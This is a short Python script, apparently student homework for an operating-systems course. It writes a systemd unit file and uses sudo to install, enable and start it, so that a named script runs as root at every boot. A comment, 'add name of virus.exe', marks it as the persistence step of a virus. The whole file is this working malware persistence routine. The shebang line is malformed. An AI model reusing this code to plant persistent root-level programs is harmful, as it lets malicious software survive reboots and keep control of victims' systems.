#!usr/bin/python3

import os



def add_to_reboot():

        exename='test.py'

        path='/home/spr/Desktop/project/OS_home_work/'

         # add name of virus.exe



        f=open(path+'boot.service',"w")

        f.write("[Unit]\nDescription= StartUp\n\n\n[Service]\nExecStart="+path+exename+" start\nUser=root\nRemainAfterExit=yes\n\n\n[Install]\nWantedBy = multi-user.target\n")

        f.close()

        os.system('sudo mv '+path+'boot.service /etc/systemd/system/') #put service with sys services

        os.system('sudo systemctl --system daemon-reload')

        os.system('sudo chown root:root /etc/systemd/system/boot.service')

        os.system('sudo chmod 755 /etc/systemd/system/boot.service')

        os.system('sudo systemctl enable boot.service') # activate the service so it could be start in each reboot

        os.system('sudo systemctl start boot.service') # start the service == lance the .exe file

	#os.system('sudo systemctl status boot.service') # this command u can execute it to verify if the service started ( see the status of the service )

	#os.system('sudo systemctl stop boot.service') # to stop the service for this time

	#os.system('sudo systemctl disable boot.service') # to stop the service from starting in each reboot